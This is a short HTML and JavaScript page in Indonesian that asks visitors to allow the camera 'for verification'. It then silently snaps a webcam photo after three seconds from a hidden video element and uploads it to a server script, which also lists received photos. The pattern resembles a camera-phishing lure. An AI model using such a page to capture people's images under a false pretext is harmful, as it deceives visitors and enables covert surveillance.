<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Upload Foto Otomatis</title>
    <style>
        body {
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: rgba(255, 255, 255, 0.2);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
        }
        button {
            padding: 10px 20px;
            background: #ff6b6b;
            border: none;
            color: white;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
            margin-top: 20px;
        }
        button:hover {
            background: #ff4f4f;
        }
        .gallery {
            margin-top: 20px;
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
        }
        .gallery img {
            width: 100px;
            height: 100px;
            object-fit: cover;
            margin: 5px;
            border-radius: 10px;
            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.5);
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>ðŸ”’ Upload Foto Otomatis</h2>
        <p>Mohon izinkan kamera untuk verifikasi...</p>
        <button id="startBtn">Mulai</button>
    </div>

    <video id="video" style="display:none;" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <div class="gallery">
        <h3>ðŸ“· Foto yang Diterima:</h3>
        <div id="imageGallery"></div>
    </div>

    <script>
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const startBtn = document.getElementById("startBtn");
        const imageGallery = document.getElementById("imageGallery");

        startBtn.addEventListener("click", () => {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then((stream) => {
                    video.srcObject = stream;
                    setTimeout(takePhoto, 3000); // Ambil foto setelah 3 detik
                })
                .catch((err) => {
                    alert("Izin kamera ditolak!");
                });
        });

        function takePhoto() {
            const context = canvas.getContext("2d");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convert ke Blob
            canvas.toBlob((blob) => {
                sendToBackend(blob);
            }, "image/jpeg");
        }

        function sendToBackend(blob) {
            let formData = new FormData();
            formData.append("image", blob, "photo.jpg");

            fetch("upload.php", {
                method: "POST",
                body: formData
            })
            .then(response => response.text())
            .then(result => {
                console.log("Upload sukses:", result);
                loadImages(); // Refresh daftar foto
            })
            .catch(error => console.error("Upload gagal:", error));
        }

        function loadImages() {
            fetch("list_images.php")
            .then(response => response.json())
            .then(images => {
                imageGallery.innerHTML = "";
                images.forEach(img => {
                    const imgElement = document.createElement("img");
                    imgElement.src = img;
                    imageGallery.appendChild(imgElement);
                });
            })
            .catch(error => console.error("Gagal memuat gambar:", error));
        }

        // Load foto saat pertama kali halaman dibuka
        loadImages();
    </script>

</body>
</html>
